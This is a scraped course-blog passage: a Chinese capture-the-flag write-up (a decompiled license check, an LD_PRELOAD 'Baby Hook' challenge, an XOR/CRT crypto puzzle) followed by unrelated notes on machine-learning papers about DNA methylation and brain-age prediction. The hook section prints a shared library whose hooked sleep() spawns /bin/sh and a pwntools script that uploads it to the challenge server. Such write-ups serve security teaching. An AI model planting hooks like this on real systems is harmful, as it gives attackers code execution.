__readfsqword(0x28u); memset(input_flag, 0, sizeof(input_flag)); v5 = 0; puts(\u0026#34;========= Baby Validating Service =========\u0026#34;); printf(\u0026#34;Enter the license \u0026gt;\u0026#34;); __isoc99_scanf(\u0026#34;%35s\u0026#34;, input_flag); if ( scan_license(input_flag, 36LL, 0xBACEB00CLL) ) puts(\u0026#34;Valid license!\u0026#34;); else puts(\u0026#34;Invalid license!\u0026#34;); return 0LL; } ::: :::spoiler IDA Decompile Code(Scan License)\n_BOOL8 __fastcall scan_license(const char *input_flag, int a2, int _0xBACEB00C) { unsigned __int8 v5; // [rsp+1Bh] [rbp-35h] int i; // [rsp+1Ch] [rbp-34h] char s1[8]; // [rsp+20h] [rbp-30h] BYREF __int64 v8; // [rsp+28h] [rbp-28h] __int64 v9; // [rsp+30h] [rbp-20h] __int64 v10; // [rsp+38h] [rbp-18h] int v11; // [rsp+40h] [rbp-10h] unsigned __int64 v12; // [rsp+48h] [rbp-8h] v12 = __readfsqword(0x28u); *s1 = 0LL; v8 = 0LL; v9 = 0LL; v10 = 0LL; v11 = 0; for ( i = 0; i \u0026lt; a2; ++i ) { v5 = enc_flag[i]; s1[i] = v5 ^ _0xBACEB00C; _0xBACEB00C = a2 - i + (v5 ^ __ROR4__(_0xBACEB00C, 1)); } return strcmp(s1, input_flag) == 0; } :::\n如果按照上面得到的code寫script會出事，具體來說會出啥事不好說，但總之IDA時不時會翻不出來也見怪不怪，反正有問題一率動態跟，至於要跟到哪裡(因為沒有main symbol，所以也不好定位)，我是直接用pwntools的raw_input()強制斷在input的地方，接著就跳到比對的部分，然後flag就出現在stack上了\nExploit # $ gdb gef➤ at {PID} gef➤ fin # until to scan_license function gef➤ b *{PIE base address}26f gef➤ c Baby Hook # Flag: FLAG{B4by_Ld_Pr3L0aD_L1bR1rY_:)} Description # Try to Hook Me :)\nnc edu-ctf.zoolab.org 10002 Flag Format：FLAG{\u0026hellip;}\n解題思路 # 這一題主要的想法很簡單，就是給他一個so file，然後她會直接用這個so file當作LD_PRELOAD，執行./chall，所以我們要做的事情概念很簡單，就是給他一個有問題的so file，然後當他執行椅面的function時，就會執行我們給他的惡意指令，例如開shell\nExploit # #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #define unlikely(x) __builtin_expect(!!(x), 0) #define TRY_LOAD_HOOK_FUNC(name) if (unlikely(!g_sys_##name)) {g_sys_##name = (sys_##name##_t)dlsym(RTLD_NEXT,#name);} typedef void* (*sys_sleep_t)(size_t size); static sys_sleep_t g_sys_sleep = NULL; void* sleep(size_t size) { execve(\u0026#34;/bin/sh\u0026#34;, (char *[]){0}, (char *[]){0}); return p; } from base64 import b64encode from pwn import * ld_file = open(\u0026#39;./libmyhook.so\u0026#39;, \u0026#39;rb\u0026#39;).read() # r = process([\u0026#39;python\u0026#39;, \u0026#39;./main.py\u0026#39;]) r = remote(\u0026#39;edu-ctf.zoolab.org\u0026#39;, 10002) print(r.recvline()) raw_input() r.sendline(b64encode(ld_file)) # print(b64encode(ld_file)) r.interactive() $ gcc -fPIC -shared -o libmyhook.so exp-hook.c -ldl $ LD_PRELOAD=./libmyhook.so ./chall # To make sure it\u0026#39;s working $ python exp.py [+] Opening connection to edu-ctf.zoolab.org on port 10002: Done b\u0026#39;Give me your share object:\\n\u0026#39; [*] Switching to interactive mode $ ls Makefile chall chall.c flag.txt main.py run.sh $ cat flag.txt FLAG{B4by_Ld_Pr3L0aD_L1bR1rY_:)} 我是直接參考1的教學，非常淺顯易懂，而且還有給sample code，做的事情簡單來說就和上面提到的一樣，當它call sleep時，就會直接執行execve開shell給我，另外這篇2的教學冶獎的很好\nExtreme Xorrrrr # Flag: flag{xor_ThEN_\u0026gt;\u0026lt;OR_1qUal_ZEr0} Description # Easy crypto problem with simple tricks.\nFlag Format: FLAG{\u0026hellip;}\nSource Code # :::spoiler Source Code\nfrom secret import flag from Crypto.Util.number import bytes_to_long, getPrime def xorrrrr(nums): n = len(nums) result = [0] * n for i in range(1, n): result = [ result[j] ^ nums[(j+i) % n] for j in range(n)] return result secret = bytes_to_long(flag) mods = [ getPrime(32) for i in range(20)] muls = [ getPrime(20) for i in range(20)] hint = [secret * muls[i] % mods[i] for i in range(20)] print(f\u0026#34;hint = {xorrrrr(hint)}\u0026#34;) print(f\u0026#34;muls = {xorrrrr(muls)}\u0026#34;) print(f\u0026#34;mods = {xorrrrr(mods)}\u0026#34;) # hint = [3867643078, 3287416726, 901811051, 2873881227, 2270268909, 1555321936, 1419723682, 135531391, 1648732744, 2346142192, 1505498859, 2103436123, 4202619523, 2326904236, 1938136472, 366121018, 773968139, 2415223764, 490067400, 1902082872] # muls = [784927, 1022769, 932825, 746975, 815007, 613147, 537543, 852211, 618443, 866769, 910981, 825227, 838133, 1027271, 776063, 1038141, 571529, 664495, 1025729, 593197] # mods = [2286703839, 2358297603, 3964421567, 3907762623, 2849800663, 2382674777, 2503252379, 2798053355, 3995552795, 2910773165, 3724203063, 2416156797, 2179309517, 3641528223, 2846518171, 2688752197, 4248246955, 2871652981, 2639686887, 4182550363] :::\n解題思路 # 我真的脫離crypto太久了，久沒做題就生疏了，這題其實也\u0026hellip;沒那麼難，應該還是有點難啦\nAnalyze Process 首先這題做的事情很簡單，他先取得mods/muls各20組質數的list，然後和flag進行運算 $$ hint[0] = secret*muls[0]\\ %\\ mods[0] \\ \u0026hellip; $$ 最後他有給經過scramble的hint/muls/mods，所以首要做的事情是把scramble後的結果還原 Descramble 他做的事情其實很簡單，靜態看不太出來，動態跟一下就出現了，basically他就是做十九次，每一次都跟隔壁的element進行xor，例如：muls[0, 1, 2, 3,..., 19]，scramble的結果會變成 $$ muls[1\\oplus 2\\oplus 3\\oplus \u0026hellip;\\oplus 19,\\ 2\\oplus 3\\oplus 4\\oplus \u0026hellip;\\oplus 19\\oplus 0,\\ 3\\oplus 4\\oplus 5\\oplus \u0026hellip;\\oplus 19\\oplus 0\\oplus 1,\u0026hellip;] $$ 所以可以看得出來，因為只做19次，scramble後的第一個element缺少原本的element 0，而第二個element缺少原本的element 1，以此類推，所以要還原就很簡單了，我先把scramble後的所有element全部XOR，這樣就可以得到$0\\oplus 1\\oplus 2\\oplus 3\\oplus \u0026hellip;\\oplus 19$的結果，然後再各自和scramble的element進行XOR，就可以extract出最一開始的element是多少 $$ Scrambled element = 1\\oplus 2\\oplus 3\\oplus \u0026hellip;\\oplus 19\\ \\oplus\\ All\\ element\\ XOR = 0\\oplus 1\\oplus 2\\oplus 3\\oplus \u0026hellip;\\oplus 19\\ =original\\ element\\ 0 $$ Decrypt Flag 有了hint/mods/muls最原始的這些東西，就可以開始想要怎麼藉由hint解密原本的flag，如果把整個equation換個表示式 $$ hint[0] = secretmuls[0]\\ %\\ mods[0] \\ \u0026hellip;\\ =\\ secretmuls[0]\\equiv\\ hint[0]\\ (mod\\ mods[0])\\ secretmuls[1]\\equiv\\ hint[1]\\ (mod\\ mods[1])\\ secretmuls[2]\\equiv\\ hint[2]\\ (mod\\ mods[2])\\ \u0026hellip; $$ 這和CRT有一點像，但CRT解的問題是secret都要一樣，所以只要把兩邊同乘以${muls[i]}^{-1}$就可以了 $$ secret\\equiv\\ hint[0]{muls[0]}^{-1}\\ (mod\\ mods[0])\\ secret\\equiv\\ hint[1]{muls[1]}^{-1}\\ (mod\\ mods[1])\\ secret\\equiv\\ hint[2]*{muls[2]}^{-1}\\ (mod\\ mods[2])\\ \u0026hellip; $$ 再利用CRT的解法，secret就出來了 Exploit # from Crypto.Util.number import * from functools import reduce def chinese_remainder(m, a): sum = 0 prod = reduce(lambda acc, b: acc*b, m) for n_i, a_i in zip(m, a): p = prod // n_i sum += a_i * mul_inv(p, n_i) * p return sum % prod def mul_inv(a, b): b0 = b x0, x1 = 0, 1 if b == 1: return 1 while a \u0026gt; 1: q = a // b a, b = b, a%b x0, x1 = x1 - q * x0, x0 if x1 \u0026lt; 0: x1 += b0 return x1 def de_xor(nums): result = [] tmp = 0 for i in range(len(nums)): tmp ^= nums[i] for i in range(len(nums)): result.append(tmp ^ nums[i]) return result def xorrrrr(nums): n = len(nums) result = [0] * n for i in range(1, n): result = [ result[j] ^ nums[(j+i) % n] for j in range(n)] return result hint = [3867643078, 3287416726, 901811051, 2873881227, 2270268909, 1555321936, 1419723682, 135531391, 1648732744, 2346142192, 1505498859, 2103436123, 4202619523, 2326904236, 1938136472, 366121018, 773968139, 2415223764, 490067400, 1902082872] muls = [784927, 1022769, 932825, 746975, 815007, 613147, 537543, 852211, 618443, 866769, 910981, 825227, 838133, 1027271, 776063, 1038141, 571529, 664495, 1025729, 593197] mods = [2286703839, 2358297603, 3964421567, 3907762623, 2849800663, 2382674777, 2503252379, 2798053355, 3995552795, 2910773165, 3724203063, 2416156797, 2179309517, 3641528223, 2846518171, 2688752197, 4248246955, 2871652981, 2639686887, 4182550363] Real_hint = de_xor(hint) Real_muls = de_xor(muls) Real_mods = de_xor(mods) assert hint == xorrrrr(Real_hint) assert muls == xorrrrr(Real_muls) assert mods == xorrrrr(Real_mods) count = 4 while(True): m = [Real_mods[i] for i in range(count)] a = [Real_hint[i]*inverse(Real_muls[i], Real_mods[i]) for i in range(count)] crt_result = chinese_remainder(m, a) if \u0026#39;flag\u0026#39; in long_to_bytes(crt_result).decode(\u0026#34;cp437\u0026#34;): print(\u0026#39;Count = \u0026#39;, count) print(long_to_bytes(crt_result).decode(\u0026#34;cp437\u0026#34;)) break count += 1 經過實測，最少的CRT組合需要八組以上才能正確還原flag，其中CRT的部分是參考3，另外理論的部分是參考4，最後inverse的靈感是來自5\nReference # linux hook機制研究\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n用 LD_PRELOAD 替換動態連結的函式庫\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nChinese Remainder Theorem Using Python\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n從高中數學不再教的韓信點兵問題，講到大學數論的中國餘數定理，在講中國餘數定理在 RSA 密碼系統上的應用\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n求且a的方法\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":189,"href":"/security/course/ntu-ml/ntu-machine-learning-final-project-proposal-notes-1/","title":"NTU Machine Learning Final Project Proposal Notes","section":"Securities","content":" NTU Machine Learning Final Project Proposal Notes # tags: NTU_ML Machine Learning # Paper Used Technique / Ingenuity Suitable / Unsuitable Reason Replace to [1] Models overview\n3D maps of gray and/or white matter (deep learning models: six layer CNN, ResNet, and Inception V1)vertex wise measurements from the surface-based processing (models BLUP and SVM)\nModel 1: Best Linear Unbiased Predictor(BLUP)Model 2: Support Vector RegressionModel 3: Six-Layer Convolutional Neural NetworksModel 4: Specialized Six-Layer Convolutional Neural Networks for Younger and Older SubjectsModel 5: ResNetModel 6: Inception V1 Additional ExperimentsDifferent Types of Model Combination: Linear Regression vs. Random ForestCombining Seven (Identical) Convolutional Neural Networks or the Seven Best EpochsInfluence of the Type of Brain Features on Prediction Accuracy Suitable:In this field, it\u0026rsquo;s very clearly on comparing 6 variety models which can help us to know the implementation what we learned in class.Also can aware of the result between high level model and custom level modelFor linear regression and random forest, they trained the ensemble algorithms on a random subset. They repeated this process 500 times to get a bootstrap estimate of the SE of the MAE. N/A [2] 2D and 3D-CNN on age estimationFor 2D-CNN, we consider the features as an image of size 168×60 (DH×M) ignoring the days as temporal information.However, for 3D-CNN, we consider the features as a 3D volume with temporal information across the days, where each day has 24 hours and an hour is 60 minutes. So to break it down, we represent the features as a three dimensional information of 7×24×60 (D×H×M) minutes. Unsuitable: Though the topic is interesting, the technique content is less then expectation and the . No Idea Yet [3] Model for classification:Random Forest, GLMNet, SVM(including e1071, which is a package of LibSVM in R language, LiblinearR, kernlab, Rgtsvm), and xgboostCalibration Algorithm(i.e. post-processing):logistic regression(GLM function), BRGLM, GLMNetPerformance evaluation: HandTill2001 Suitable:The reason is as the same as [1] which also used various methods and compare it to other papers detailed. N/A Appendix # The custom model in [1] Self-defined ResNet in [1] Self-defined Inception V1 in [1] The whole result of experience in [1] Architecture of the proposed DL methods in [2] The reuslt in [3] Reference # [1]Machine learning workflows to estimate class probabilities for precision cancer diagnostics on DNA methylation microarray data [2]Estimating Biological Age from Physical Activity using Deep Learning with 3D CNN [3]Ensemble Learning of Convolutional Neural Network, Support Vector Machine, and Best Linear Unbiased Predictor for Brain Age Prediction\n"},{"id":190,"href":"/security/course/ntu-ml/ntu-machine-learning-final-project-proposal-notes/","title":"NTU Machine Learning Final Project Proposal Notes","section":"Securities","content":" NTU Machine Learning Final Project Proposal Notes # tags: NTU_ML Machine Learning # Deep6mAPred: A CNN and Bi-LSTM-based deep learning method for predicting DNA N6-methyladenosine sites across plant species # Introduction \u0026amp; Motivation # DNA methylation alters activities of DNA segments without changing the sequence, which thus yields a wide variety of roles in the cellular processes across organisms or tissues DNA methylation is widely distributed both in prokaryote and in eukaryote, but the proportion of methylated residues differs greatly with species DNA methylation is essential for normal development DNA methylation is increasingly attracting attentions from biologists Related works # Even Luo et al.[41] - proposed the DNA 6mA as a new epigenetic mark in eukaryotes\n2 major ways to detect DNA 6mA sites:\nWet experiments mass spectrometry / methylation-specific polymerase chain reaction / single-molecule real-time sequencing Times consuming / expensive / labor-intensive Dry experiments - computational methods learning a classifier: feature-based and the deep learning-based methods Pian et al.[45] - employed transition probability between adjacent nucleotides to construct a Markov model to identify 6mA site Chen et al.[47] – SVM based method for rice 6mA prediction The i6mA-DNCP[51] - improve the representation with optimized dinucleotide-based features iDNA6mA-Rice[1] – multiple encoding schemes as representations / random forest 6mA-RicePred[53] – fused multiple features including Markov feature for rice 6mA prediction csDMA[54] – three representations and explore the best one 6mA-Finder[55] – seven sequence-based coding schemes iIM-CNN - employed CNN iDNA6mA - deep learning-based method / CNN Huang et al. [72] - LSTM-based method called 6mA-Pred Le et al. [73] - employed transformer-based BERT DNA6mA-MINT [74] - stacked CNN and LSTM simply Appendix\n[41]G.Z. Luo, M.A. Blanco, E.L. Greer, C. He, Y. Shi, DNA N(6)-methyladenine: a new epigenetic mark in eukaryotes? Nat. Rev. Mol. Cell Biol. 16 (12) (2015) 705–710, https://doi.org/10.1038/nrm4076. [45] C. Pian, G. Zhang, F. Li, X. Fan, MM-6mAPred: identifying DNA N6- methyladenine sites based on Markov model, Bioinformatics 36 (2) (2020) 388–392, https://doi.org/10.1093/bioinformatics/btz556. [47] W. Chen, H. Lv, F. Nie, H. Lin, i6mA-Pred: identifying DNA N6-methyladenine sites in the rice genome, Bioinformatics 35 (16) (2019) 2796–2800, https://doi.org/10.1093/bioinformatics/btz015. [51] L. Kong, L. Zhang, i6mA-DNCP: computational identification of DNA N6- methyladenine sites in the rice genome using optimized dinucleotide-based features, Genes 10 (10) (2019) 828, https://doi.org/10.3390/genes10100828. [1] H. Lv, F.Y. Dao, Z.X. Guan, D. Zhang, J.X. Tan, Y. Zhang, W. Chen, H. Lin, iDNA6mA-Rice: a computational tool for detecting N6-methyladenine sites in rice, Front. Genet. 10 (2019) 793, https://doi.org/10.3389/fgene.2019.00793. [53] Q. Huang, J. Zhang, L. Wei, F. Guo, Q. Zou, 6mA-RicePred: a method for identifying DNA N6-methyladenine sites in the rice genome based on feature fusion, Front. Plant Sci. 11 (2020) 4, https://doi.org/10.3389/fpls.2020.00004. [54] Z. Liu, W. Dong, W. Jiang, Z. He, csDMA: an improved bioinformatics tool for identifying DNA 6 mA modifications via Chou’s 5-step rule, Sci. Rep. 9 (1) (2019) 1–9, https://doi.org/10.1038/s41598-019-49430-4. [55] H. Xu, R. Hu, P. Jia, Z. Zhao, 6mA-Finder: a novel online tool for predicting DNA N6-methyladenine sites in genomes, Bioinformatics 36 (10) (2020) 3257–3259, https://doi.org/10.1093/bioinformatics/btaa113. [72] Q. Huang, W. Zhou, F. Guo, L. Xu, L. Zhang, 6mA-Pred: identifying DNA N6- methyladenine sites based on deep learning, PeerJ 9 (2021), e10813, https://doi.org/10.7717/peerj.10813. [73] N.Q.K. Le, Q.T. Ho, Deep transformers and convolutional neural network in identifying DNA N6-methyladenine sites in cross-species genomes, Methods (2021), https://doi.org/10.1016/j.ymeth.2021.12.004. [74] M.U. Rehman, K.T. Chong, DNA6mA-MINT: DNA-6mA Modification Identification Neural Tool, Genes 11 (8) (2020) 898, https://doi.org/10.3390/genes11080898. Background # What is methylation? DNA methylation alters activities of DNA segments without changing the sequence, which thus yields a wide variety of roles in the cellular processes across organisms or tissues. In addition, the DNA methylation appears essential for normal development. What is 6mA? The 6mA refers to a biological process where the methyl group is attached to the 6-th nitrogen atom of adenine by the enzyme of DNA methyltransferase. The 6mA is a type of non-canonical DNA modification because it might occur in other nucleotide molecules including mRNA, tRNA, rRNA, small nuclear RNA (snRNA) as well as long non coding RNA Why is it important? A large volume of evidence suggested that the DNA 6mA would play vital roles in many key biological processes. The DNA 6mA participated in regulation of gene expression both in prokaryotes and in some eukaryotes, and was responsible for DNA repair as well as DNA replication. The 6mA distinguished invading foreign DNAs from host DNA in prokaryotes, was closely associated with many disease including tumor in human genome, and was involved in regulation of drug resistance in triple negative breast cancer My Opinions # For this paper, my perspective is this is a little bit trivial to solve the problem. For simplicity speaking, they just change the stacking model structure to a sequence structure. In addition, the result of this paper is exaggerating.\nComparison # The result below is the experience on 6mA-rice-LV(rice) dataset, and this paper method is Deep6mAPred. They used 5-fold cross validation on this data(6mA-rice-LV). In the original context, they said:\nThe Deep6mAPred reached better Sn than three baseline methods (Deep6mA , SNNRice6mA-large and Deep6mAPred), and achieved competitive SP, ACC and MCC in contrast with the Deep6mA, which completely outperformed the SNNRice6mA-large and MM-6mAPred.\nHowever, the fun fact is the performance of $Sp, ACC, MCC, AUC$ is not good enough in this dataset.\nThe result below is for 6mA-rice-chen dataset. Compared with Deep6mA, Deep6mAPred increased $Sn$ by 0.1572, ACC by 0.0750, MCC by 0.1436, and AUC of ROC curve by 0.0237, completely superior to the other two methods. The $Sp$ of Deep6mAPred is slightly lower than that of Deep6mA, but much higher than that of the other two methods. This result is quite distinguished that can show how special their model is under this another rice data.\nThis is ROC curves and PR curves result on 6mA-Fuse-R(Rosa chinensis) and 6mA-Fuse-F(Fragaria vesca, a kind of wild strawberry) respectively. In order to show how robust on their model, they try to test different species such as rose and wild strawberry without training, and the result is quite significant that almost similar to rice data. This is a self-created table that I wanna show the AUC of two curves with different species. The original context said:\nAs for the 6mA-Fuse-R, the Deep6mAPred outperformed three baseline methods in terms of the AUCs of ROC curves, while in terms of the AUCs of the PR curves it was equivalent to the Deep6mA but superior to the SNNRice6mA-large and MM-6mAPred a bit\nFollow the description above, we can know that the result of 6mA-Fuse-R is better than three baseline methods but without any table or figure to prove that and this is not rigourous enough for this information. They also do some ablation experiment to prove that the attention mechanism they choose is quite valid and useful in this project. We can see that in each experiment of different species, with attention mechanism is generally better than the experiment that without attention. Other Issue # Why can wild rose and rice use the same architecture or we can ask how to process input data so that they can be applicable at the same model structure. There is no extra explanation for the selected attention mechanism method. Conclusion # The 6mA is a key mechanism of regulation in the cellular processes. We presented a CNN and LSTM-based method (Deep6mAPred) with paralleling manner They also used attention mechanism to improve their model and it\u0026rsquo;s really helpful proved by ablation experiment. In addition, they developed a user-friendly webserver to automatically detect 6mA sites Deep6mAPred can also detect other plants References # Ensemble Learning of Convolutional Neural Network, Support Vector Machine, and Best Linear Unbiased Predictor for Brain Age Prediction: ARAMIS Contribution to the Predictive Analytics Competition 2019 Challenge # Introduction \u0026amp; Motivation # Chronological age is an important risk factor for many conditions such as neurological disorders (e.g., Alzheimer’s and Parkinson’s), chronic (including cardiovascular) disorders, cancer, or stroke, to name a few. However, it is an imperfect predictor of disease risk or of healthy individuals’ functional capability Brain age (and PAD(predicted age difference)) trained on healthy participants may be applied to case-control samples where they have been shown to be non-specific predictors of disease status: Alzheimer’s disease and conversion[8-10], schizophrenia[11], alcohol dependence[12], cognitive impairment[13], or functional abilities[6, 14] However, chronological age cannot explain everything, brain age correlates with disease, mortality, and function beyond what chronological age can explain Related works # [2]Cole J, Marioni RE, Harris SE, Deary IJ. Brain age and other bodily “ages”: implications for neuropsychiatry. Mol Psychiatr. (2019) 24:266–81. doi: 10.1038/s41380-018-0098-1 [3]Horvath S, Raj K. DNA methylation-based biomarkers and the epigenetic clock theory of ageing. Nat Rev Genet. (2018) 19:371–84. doi: 10.1038/s41576-018-0004-3 [4]Sajedi H, Pardakhti N. Age prediction based on brain MRI image: a survey. J Med Syst. (2019) 43:279. doi: 10.1007/s10916-019-1401-7 [5]Baker GT, Sprott RL. Biomarkers of aging. Exp Gerontol. (1988) 23:223–39. doi: 10.1016/0531-5565(88)90025-3 [6]Cole J, Ritchie SJ, Bastin ME, Valdés Hernández MC, Muñoz Maniega S, Royle N, et al. Brain age predicts mortality. Mol Psychiatr. (2018) 23:1385–92. doi: 10.1038/mp.2017.62 [8]Franke K, Gaser C. Longitudinal changes in individual brainAGE in healthy aging, mild cognitive impairment, alzheimer’s disease. GeroPsych. (2012) 25:235–45. doi: 10.1024/1662-9647/a000074 [9]Gaser C, Franke K, Klöppel S, Koutsouleris N, Sauer H. BrainAGE in mild cognitive impaired patients: predicting the conversion to alzheimer’s disease. PLoS ONE. (2013) 8:67346. doi: 10.1371/journal.pone.0067346 [10]Wang J, Knol MJ, Tiulpin A, Dubost F, Bruijne M, de, et al. Gray matter age prediction as a biomarker for risk of dementia. Proc Natl Acad Sci USA. (2019) 116:21213–8. doi: 10.1073/pnas.1902376116 [11]Koutsouleris N, Davatzikos C, Borgwardt S, Gaser C, Bottlender R, Frodl T, et al. Accelerated brain aging in schizophrenia and beyond: a neuroanatomical marker of psychiatric disorders. Schizophrenia Bull. (2014) 40:1140–53. doi: 10.1093/schbul/sbt142 [12]Guggenmos M, Schmack K, Sekutowicz M, Garbusow M, Sebold M, Sommer C, et al. Quantitative neurobiological evidence for accelerated brain aging in alcohol dependence. Transl Psychiatr. (2017) 7:1279. doi: 10.1038/s41398-017-0037-y [13]Liem F, Varoquaux G, Kynast J, Beyer F, Kharabian Masouleh S, Huntenburg JM, et al. Predicting brain-age from multimodal imaging data captures cognitive impairment. NeuroImage. (2017) 148:179–88. doi: 10.1016/j.neuroimage.2016.11.005 [14]Beheshti I, Maikusa N, Matsuda H. The association between “Brain- Age Score” (BAS) and traditional neuropsychological screening tools in Alzheimer’s disease. Brain Behav. (2018) 8:e01020. doi: 10.1002/brb3.1020\nBackground # Latest research focus on telomere length, methylation site, brain structure, and function[2-6] In particular, brain age estimation from MRI images is a rapidly expanding field of research with several hundred publications to date My Opinions # The main opinion to this paper is that it\u0026rsquo;s report of the competition they attended. And listed as clear as possible what problems they encountered, what techniques they used etc.\nComparison # The * symbol represents a significant reduction in $MAE$ by Ensemble Learning compared to Inception alone ($p\\ value \u0026lt; 0.05$)\nFor the objective of minimize MAE, the way of deep learning is better than BLUP and SVM ($pvalue\\ of\\ paired\\ t-test\u0026lt;3.1e-4$) There was no significant difference in the performance of the deep learning algorithms ($p \u0026gt; 0.027$) In contrast, Ensemble Learning\u0026rsquo;s $MAE=3.46$, there is a significant difference (p=1.3e-4) Taking challenge 2 as an example, the author uses median and mean absolute deviation per site to rescale the prediction. The results show that $MAE$ will increase by one year compared to the original one, but will reduce the bias. The same that ensemble learning has a significant improvement compared to Inception($p=0.010$). They also tried to evaluate whether their conclusions depend on the train/test split used in the previous section by performing a 5-fold cross-validation experiment.\nWithin each fold, they found a nominally significant difference in MAE between BLUP/SVM and ResNet ($p \u0026lt; 5.5E−3$) In each fold, the composite age score using linear regression outperformed Inception V1\u0026rsquo;s predictions ($p \u0026lt; 0.0022$). For folds 2 and 3, ensemble learning via random trees significantly outperforms Inception V1 alone ($p=4.0E−3 and 3.4E−4$) Note that the $MAE$ obtained using Random Forest is very close to the $MAE$ obtained by taking the mean or median score for each person. We cannot conclude that there is a significant difference between linear model combinations and random forests. The low performance of BLUP/SVM shown above compared to deep learning algorithms motivated the authors to test whether it could be attributed to the input data or the algorithm itself. Therefore, the author retrains BLUP and SVM (trained on gray matter maps)\n† Symbols represent: the algorithm trained with gray matter map is significantly better than the algorithm trained with surface-based vertices ($p \u0026lt; 0.05/15$). The * symbol indicates: the performance of the algorithm trained on the gray matter image is significantly lower than that of Inception V1 ($p \u0026lt; 0.05/15$) Despite the reduction in MAE, BLUP-mean and SVM trained on gray matter still performed worse than Inception V1 ($p \u0026lt; 0.0033$), although the difference between Inception V1 and BLUP-quantile became not significant. The participant is older, the prediction error is larger. → Therefore, the predictor will tends to underestimate the age of older participants and overestimate the age of younger participants. We did not observe significant associations of prediction errors with gender or location Other Issue # They didn\u0026rsquo;t explain why they used two 6-Layers CNN to combine and the effect in detailed. They also didn\u0026rsquo;t explain the gray/white matter map difference and the properties of these maps in detailed. Conclusion # Proposed an ensemble learning algorithm of 7 different age predictions from T1w MRI images Ranked third in PAC2019 Ranking of prediction accuracy may be highly dependent on the metric chosen as well as on the test data Evaluated the effect on performance of algorithm choice, ensemble learning methods, feature input/data processing, number and type of scores in ensemble learning, and covariates such as age, sex, and site References # Machine learning workflows to estimate class probabilities for precision cancer diagnostics on DNA methylation microarray data # Introduction \u0026amp; Motivation # DNA methylation data-based precision cancer diagnostics Application for class probability (CP): Stratified Medicine Standards for choosing statistical methods with regard to well-calibrated probability estimates for these typically highly multiclass classification tasks are still lacking We compared these workflows on a recently published brain tumor 450k DNA methylation cohort of 2,801 samples with 91 diagnostic categories using a 5 5-fold nested cross validation scheme and demonstrated their generalizability on external data from The Cancer Genome Atlas Purpose of this study: to perform a benchmark analysis to support the choice for optimal DNA methylation microarray data analysis through extensive comparisons of well-established ML classifiers and their combination with post-processing algorithms such as Platt Scaling and ridge-penalized multinomial L(MR) ELNET was the top stand-alone classifier The best overall two-stage workflow was MR-calibrated SVM with linear kernels closely followed by ridge-calibrated tuned RF MR was the most effective regardless of the primary classifier The number of features (p) vastly outnumbers the sample size (n) Therefore, a more reasonable require predictions ment is that the estimated CP function provides well-calibrated(e.g. Platt scaling) Multiclass classification problems → unbalanced classification problems Related works # High multiclass \u0026amp; unbalanced classification problem [7]Baek, S., Tsai, C.-A. \u0026amp; Chen, J. J. Development of biomarker classifiers from high-dimensional data. Brief.Bioinform. 10, 537–546 (2009). [8]Dupuy, A. \u0026amp; Simon, R. M. Critical review of published microarray studies for cancer outcome andguidelines on statistical analysis and reporting. J. Natl Cancer Inst. 99,147–157 (2007). [9]. Hastie, T., Tibshirani, R. \u0026amp; Friedman, J. The Elements of Statistical Learning: Data Mining, Inference andPrediction 2nd edn (Springer, New York, NY, 2009). [10]. Lee, J. W., Lee, J. B., Park, M. \u0026amp; Song, S. H. An extensive comparison of recent classification tools applied tomicroarray data. Comput. Stat. Data Anal. 48, 869–885 (2005). [11]. Simon, R. Roadmap for developing and validating therapeutically relevant genomic classifiers. J. Clin. Oncol.23, 7332–7341 (2005). DNA methylation application [1]. Capper, D. et al. DNA methylation-based classification of central nervous system tumours. Nature 555,469–474 (2018). [4]. Rodríguez-Paredes, M. \u0026amp; Esteller, M. Cancer epigenetics reaches mainstream oncology. Nat. Med. 17,330–339 (2011). [13]. Fernandez, A. F. et al. A DNA methylation fingerprint of 1628 human samples. Genome Res. 22, 407–419 (2012). [14]. Wiestler, B. et al. Assessing CpG island methylator phenotype, 1p/19q codeletion, and MGMT promotermethylation from epigenome-wide data in the biomarker cohort of the NOA-04 trial. Neuro Oncol. 16,1630–1638 (2014). The number of features (p) vastly outnumbers the sample size (n) [9]. Hastie, T., Tibshirani, R. \u0026amp; Friedman, J. The Elements of Statistical Learning: Data Mining, Inference and Prediction 2nd edn (Springer, New York, NY, 2009). [20]. Simon, R. Class probability estimation for medical studies. Biom. J. 56, 597–600 (2014). Background # The problem of stratified medicine Unbiased classification problem (there are fewer patients in some categories, of course there will be inequality problems) Usually medical diagnosis is to classify patients in several categories of interest, but real medical behavior should be able to achieve multi-category diagnosis (50 or more than 100 categories) My Opinions # This paper is just like a Readme file that wanna teach someone how to use their tool, each technique they used, each problem they encountered, and also which programming package they used etc. as clear as possible. Although the paper should be as clear as possible, but too much unnecessary information is really a waste of time and annoying.\nComparison # Random Forest(RFs)\nVanilla RF(vRF) The ME of vRF was 4.8%, the AUC was 99.9%, and the corresponding BS and LL were 0.32 and 0.78, respectively Platt scaling with LR and FLR improves BS and LL by a factor of 2-4, furthermore, FLR is better than LR MR slightly outperformed Platt\u0026rsquo;s two variants and achieved very low 10th and 9th overall BS (0.073) and LL (0.155) metrics respectively tuned RF(tRF) RF tuned for ME (tRFME) showed 10th overall error rate (3.5%) and 4th AUC (99.9%), while it had relatively high BS (0.35) and LL (0.86) similar to vRF Both tRFBS and tRFLL have higher error rates, about 5.5% After calibration with MR, almost all versions of tRF get the biggest performance improvement ELNET\nIt used 1,000 most variable CpG probes ME ranked 8th, AUC ranked 5th ME (2.7%), BS (0.048) and LL (0.109) and negligibly low AUC (99.9 %) SVM\nMore effective ME = 2.1% (lowest overall) with Platt scaling with Firth regression While simple LR can be more effective to improve BS (second) and LL (fourth) by 8-9 times respectively MR (SVM-LK+MR) achieves the most comprehensive improvement across all metrics. It reduced BS by a factor of 9.5 and LL by a factor of 11.5, resulting in the second lowest ME (2.1%) and AUC (99.9%), lowest BS (0.039) and lowest LL (0.085) Boost Tree\nBoosted model using ME as evaluation metric outperforms model using LL Overall ME of 5.1% and AUC of 99.9%, with the second lowest BS (0.15) and LL (0.43) among the base ML classifiers studied Other Issue # Conclusion # We performed extensive comparative analyses of four well-established classifier algorithms including RF, ELNET, SVM and boosted ensemble trees in combination with Platt scaling and multinomial ridge regression The best overall two-stage workflow was MR-calibrated SVM-LK, and it generated the best overall BS, LL 